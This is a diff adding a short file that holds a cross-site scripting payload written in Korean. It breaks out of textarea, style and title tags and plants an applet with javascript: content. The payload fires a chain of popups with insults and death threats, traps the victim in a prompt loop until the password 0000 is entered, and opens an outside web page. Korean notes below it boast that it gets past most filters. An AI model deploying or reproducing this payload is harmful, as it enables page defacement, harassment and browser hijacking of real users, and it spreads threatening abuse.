@@ -1,0 +1,4 @@
+﻿</textarea></Style></title><applet data=javascript:;{alert("이넘아~?");}{alert("짱나제~!!");}{alert("나누구게?");}{alert("열받제~병신아~!!");}{alert("그러니까~까불지마라");}{alert("병신도~깝죽되면죽는거다~");}{alert("흰사자앞에서~까불지말라");}{alert("따라다니면서~죽여주마~!!");};m=prompt("알면도망가라~나보면죽인다~~~!");&#119hile(m!=0000)javascript:window.open("http://www.netian.com/~soma7/비.html");></applet>
+
+앞의 방어해제를 더했기때문에 에플릿방어와 옵션방어 왜의 모든 방어는 다 뚫고 퍽을 때릴수 있습니다
+물론 비번은 0000져...^^
